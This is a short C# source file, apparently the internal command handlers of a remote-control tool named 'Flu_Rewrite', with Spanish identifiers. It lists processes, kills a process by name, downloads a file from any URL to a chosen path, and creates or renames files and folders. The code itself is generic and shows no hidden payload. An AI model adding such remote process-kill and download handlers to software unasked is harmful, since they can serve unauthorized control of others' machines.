using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Net;
using System.IO;

namespace Flu_Rewrite
{
    class ComandosInternos
    {

        public static String[] ListadeProcesos()
        {
            Process[] Procesos = Process.GetProcesses();
            //Magia, Magia, Que se Haga LINQ :) [Funcion Lambda :P]
            return Procesos.Select(x => x.ProcessName).ToArray();
        }

        public static Boolean MatarProceso(String Proceso)
        {
            try
            {
                Process Proc = Process.GetProcessesByName(Proceso).FirstOrDefault();
                if (Proc == null) return false;
                Proc.Kill();
                return true;
            }
            catch { return false; }
        }

        public static Boolean DescargarArchivo(String URL, String Ruta)
        {
            try { File.WriteAllBytes(Ruta, (new WebClient()).DownloadData(URL)); return true; }
            catch { return false; }
        }

        public static Boolean CrearCarpeta(String Ruta)
        {
            try { Directory.CreateDirectory(Ruta); return true; }
            catch { return false; }
        }

        public static Boolean RenombrarArchivo(String Inicio, String Destino)
        {
            try { File.Move(Inicio, Destino); return true; }
            catch { return false; }
        }

        public static Boolean RenombrarCarpeta(String Inicio, String Destino)
        {
            try { Directory.Move(Inicio, Destino); return true; }
            catch { return false; }
        }
    }
}
